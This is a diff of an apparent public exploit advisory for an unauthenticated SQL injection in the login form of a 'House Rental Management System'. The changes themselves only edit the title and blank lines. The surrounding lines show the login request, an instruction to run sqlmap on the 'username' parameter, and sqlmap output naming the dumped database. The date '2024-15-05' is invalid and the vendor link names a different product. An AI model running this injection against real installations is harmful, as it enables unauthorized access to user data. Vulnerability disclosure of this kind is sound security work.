@@ -1,5 +1,5 @@
-# House Rental Management System - SQL Injection - 1
-+ **Exploit Title:** House Rental Management System - SQL Injection - 1
+# House Rental Management System - SQL Injection - 1 (Unauthenticated)
++ **Exploit Title:** House Rental Management System - SQL Injection - 1 (Unauthenticated)
 + **Date:** 2024-15-05
 + **Exploit Author:** Burak Sevben
 + **Vendor Homepage:** https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html
@@ -41,7 +41,6 @@ Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygr
 Connection: close
 
 username=test&password=test
-
 ```
 
 + Use sqlmap to exploit. In sqlmap, use 'username' parameter to dump the database.
@@ -69,7 +68,6 @@ back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 [16:47:40] [INFO] fetching current database
 [16:47:40] [INFO] retrieved: 'house_rental_latest'
 current database: 'house_rental_latest'
-
 ```
 + current database: `house_rental_latest`
 
